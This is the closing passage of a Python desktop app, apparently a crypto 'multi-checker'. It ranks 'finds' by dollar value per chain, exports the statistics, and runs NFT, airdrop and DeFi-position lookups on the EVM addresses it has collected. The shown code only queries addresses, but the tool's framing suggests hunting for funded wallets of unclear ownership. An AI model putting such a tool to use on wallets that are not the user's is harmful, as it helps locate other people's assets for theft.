        
        # Лучшая находка
        if stats["best_find"]["amount"] > 0:
            best_frame = ctk.CTkFrame(win, fg_color=CARD2, corner_radius=10)
            best_frame.pack(padx=20, pady=10, fill="x")
            
            ctk.CTkLabel(best_frame, text="🏆 Лучшая находка",
                         font=("Segoe UI", 14, "bold"), text_color=YELLOW
                         ).pack(pady=(12, 4), anchor="w", padx=15)
            
            best_info = ctk.CTkFrame(best_frame, fg_color="transparent")
            best_info.pack(fill="x", padx=15, pady=(0, 12))
            
            ctk.CTkLabel(best_info, text=stats["best_find"]["address"],
                         font=("Consolas", 11), text_color=TEXT
                         ).pack(anchor="w")
            ctk.CTkLabel(best_info, 
                         text=f"${stats['best_find']['amount']:,.2f}  •  {stats['best_find']['chain']}",
                         font=("Segoe UI", 12, "bold"), text_color=GREEN
                         ).pack(anchor="w", pady=(2, 0))
        
        # Статистика по сетям
        ctk.CTkLabel(win, text="📍 Статистика по сетям",
                     font=("Segoe UI", 14, "bold"), text_color=TEXT
                     ).pack(padx=20, pady=(10, 4), anchor="w")
        
        chains_frame = ctk.CTkScrollableFrame(win, fg_color=CARD, corner_radius=10, height=200)
        chains_frame.pack(padx=20, pady=(0, 10), fill="both", expand=True)
        
        if stats["by_chain"]:
            for chain, data in sorted(stats["by_chain"].items(), 
                                     key=lambda x: x[1]["total_usd"], reverse=True):
                row = ctk.CTkFrame(chains_frame, fg_color=CARD2, corner_radius=8)
                row.pack(fill="x", padx=8, pady=4)
                
                left_frame = ctk.CTkFrame(row, fg_color="transparent")
                left_frame.pack(side="left", padx=12, pady=8)
                
                ctk.CTkLabel(left_frame, text=chain.upper(),
                             font=("Segoe UI", 12, "bold"), text_color=ACCENT
                             ).pack(anchor="w")
                ctk.CTkLabel(left_frame, text=f"{data['count']} адресов",
                             font=("Segoe UI", 10), text_color=MUTED
                             ).pack(anchor="w")
                
                ctk.CTkLabel(row, text=f"${data['total_usd']:,.2f}",
                             font=("Segoe UI", 13, "bold"), text_color=GREEN
                             ).pack(side="right", padx=12, pady=8)
        else:
            ctk.CTkLabel(chains_frame, text="Нет данных",
                         font=("Segoe UI", 11), text_color=MUTED
                         ).pack(pady=20)
        
        # Кнопка экспорта
        export_btn = ctk.CTkButton(
            win, text="💾 Экспортировать статистику",
            font=("Segoe UI", 12, "bold"),
            fg_color=PURPLE, hover_color="#a371f7",
            corner_radius=8, height=38,
            command=lambda: self._export_crypto_stats(stats)
        )
        export_btn.pack(padx=20, pady=(10, 20), fill="x")
    
    def _export_crypto_stats(self, stats):
        """Экспортировать статистику в JSON файл."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"crypto_stats_{timestamp}.json"
            
            import json
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(stats, f, indent=2, ensure_ascii=False)
            
            print(f"✓ Статистика сохранена в {filename}")
        except Exception as e:
            print(f"✗ Ошибка экспорта: {e}")
    
    def check_nfts(self, w):
        """Проверить NFT на найденных адресах"""
        if not self.all_results:
            self.log(w, "❌ Нет результатов для проверки NFT")
            return
        
        self.log(w, "🖼️ Запуск NFT Checker...")
        
        # Находим все EVM адреса
        evm_addresses = []
        for r in self.all_results:
            if r.get("wallet_type") in ["ethereum", "polygon", "bsc", "base", "arbitrum", "optimism"]:
                addr = r.get("input", "")
                if addr.startswith("0x") and len(addr) == 42:
                    evm_addresses.append((addr, r.get("wallet_type", "ethereum")))
        
        if not evm_addresses:
            self.log(w, "❌ EVM адреса не найдены. NFT Checker работает только с Ethereum/Polygon/BSC адресами.")
            return
        
        self.log(w, f"🔍 Найдено {len(evm_addresses)} EVM адресов для проверки...")
        
        # Запускаем проверку в отдельном потоке
        def run_nft_check():
            from checkers.nft_checker import NFTChecker
            checker = NFTChecker()
            
            found_nfts = []
            
            for addr, chain in evm_addresses[:10]:  # Проверяем первые 10
                try:
                    result = asyncio.run(checker.check_nfts(addr, chain))
                    
                    if result.get("total_nfts", 0) > 0:
                        found_nfts.append(result)
                        formatted = checker.format_nft_result(result)
                        self.log(w, f"\n{'='*60}")
                        self.log(w, f"📍 Адрес: {addr[:10]}...{addr[-8:]}")
                        self.log(w, formatted)
                
                except Exception as e:
                    self.log(w, f"❌ Ошибка проверки {addr[:10]}...: {e}")
            
            if found_nfts:
                total_value = sum(r.get("total_value_usd", 0) for r in found_nfts)
                self.log(w, f"\n{'='*60}")
                self.log(w, f"🎉 ИТОГО: Найдено NFT на ${total_value:,.2f}!")
            else:
                self.log(w, "\n📭 NFT не найдено на проверенных адресах")
        
        threading.Thread(target=run_nft_check, daemon=True).start()
    
    def check_airdrops(self, w):
        """Проверить eligibility для аирдропов"""
        if not self.all_results:
            self.log(w, "❌ Нет результатов для проверки аирдропов")
            return
        
        self.log(w, "🪂 Запуск Airdrop Hunter...")
        
        # Находим все EVM адреса
        evm_addresses = []
        for r in self.all_results:
            if r.get("wallet_type") in ["ethereum", "polygon", "bsc", "base", "arbitrum", "optimism"]:
                addr = r.get("input", "")
                if addr.startswith("0x") and len(addr) == 42:
                    evm_addresses.append(addr)
        
        if not evm_addresses:
            self.log(w, "❌ EVM адреса не найдены")
            return
        
        self.log(w, f"🔍 Проверка {len(evm_addresses)} адресов на аирдропы...")
        
        def run_airdrop_check():
            from checkers.airdrop_hunter import AirdropHunter
            hunter = AirdropHunter()
            
            eligible_count = 0
            total_value = 0.0
            
            for addr in evm_addresses[:10]:  # Первые 10
                try:
                    result = asyncio.run(hunter.check_airdrops(addr))
                    
                    if result.get("eligible_airdrops"):
                        eligible_count += 1
                        total_value += result.get("total_estimated_value", 0)
                        
                        formatted = hunter.format_airdrop_result(result)
                        self.log(w, f"\n{'='*60}")
                        self.log(w, f"📍 Адрес: {addr[:10]}...{addr[-8:]}")
                        self.log(w, formatted)
                
                except Exception as e:
                    self.log(w, f"❌ Ошибка: {e}")
            
            if eligible_count > 0:
                self.log(w, f"\n{'='*60}")
                self.log(w, f"🎉 ИТОГО: {eligible_count} адресов eligible на ~${total_value:,.0f}!")
            else:
                self.log(w, "\n📭 Eligible аирдропы не найдены")
        
        threading.Thread(target=run_airdrop_check, daemon=True).start()
    
    def check_defi_positions(self, w):
        """Проверить DeFi позиции"""
        if not self.all_results:
            self.log(w, "❌ Нет результатов для проверки DeFi")
            return
        
        self.log(w, "📊 Запуск DeFi Positions Checker...")
        
        # Находим все EVM адреса
        evm_addresses = []
        for r in self.all_results:
            if r.get("wallet_type") in ["ethereum", "polygon", "bsc"]:
                addr = r.get("input", "")
                if addr.startswith("0x") and len(addr) == 42:
                    evm_addresses.append(addr)
        
        if not evm_addresses:
            self.log(w, "❌ EVM адреса не найдены")
            return
        
        self.log(w, f"🔍 Проверка {len(evm_addresses)} адресов на DeFi позиции...")
        
        def run_defi_check():
            from checkers.defi_positions import DeFiPositionsChecker
            checker = DeFiPositionsChecker()
            
            found_positions = 0
            total_value = 0.0
            
            for addr in evm_addresses[:10]:  # Первые 10
                try:
                    result = asyncio.run(checker.check_positions(addr))
                    
                    if result.get("total_value_usd", 0) > 0:
                        found_positions += 1
                        total_value += result["total_value_usd"]
                        
                        formatted = checker.format_defi_result(result)
                        self.log(w, f"\n{'='*60}")
                        self.log(w, f"📍 Адрес: {addr[:10]}...{addr[-8:]}")
                        self.log(w, formatted)
                
                except Exception as e:
                    self.log(w, f"❌ Ошибка: {e}")
            
            if found_positions > 0:
                self.log(w, f"\n{'='*60}")
                self.log(w, f"🎉 ИТОГО: Найдено DeFi позиций на ${total_value:,.2f}!")
            else:
                self.log(w, "\n📭 DeFi позиции не найдены")
        
        threading.Thread(target=run_defi_check, daemon=True).start()


if __name__ == "__main__":
    app = MultiCheckerApp()
    app.mainloop()
